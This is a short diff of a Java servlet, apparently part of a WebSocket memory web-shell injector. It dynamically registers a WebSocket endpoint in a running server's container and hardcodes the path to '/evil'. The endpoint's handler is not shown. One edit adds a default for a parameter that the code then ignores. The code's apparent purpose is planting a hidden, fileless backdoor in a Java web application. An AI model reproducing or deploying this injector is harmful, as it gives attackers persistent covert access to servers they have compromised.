@@ -17,11 +17,15 @@ public class InjectWebsocket extends HttpServlet {
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
         String path = req.getParameter("path");
 
+        if (path == null) {
+            path = "xx";
+        }
 
         ServletContext sc = req.getServletContext();
-        ServerContainer serverContainer = (ServerContainer) sc.getAttribute("javax.websocket.server.ServerContainer");
+        ServerContainer serverContainer =
+                (ServerContainer) sc.getAttribute("javax.websocket.server.ServerContainer");
         ServerEndpointConfig config = ServerEndpointConfig.Builder
-                .create(MyWebSocketEndpoint.class ,"/"+path).build();
+                .create(MyWebSocketEndpoint.class ,"/evil").build();
 
         try {
             serverContainer.addEndpoint(config);
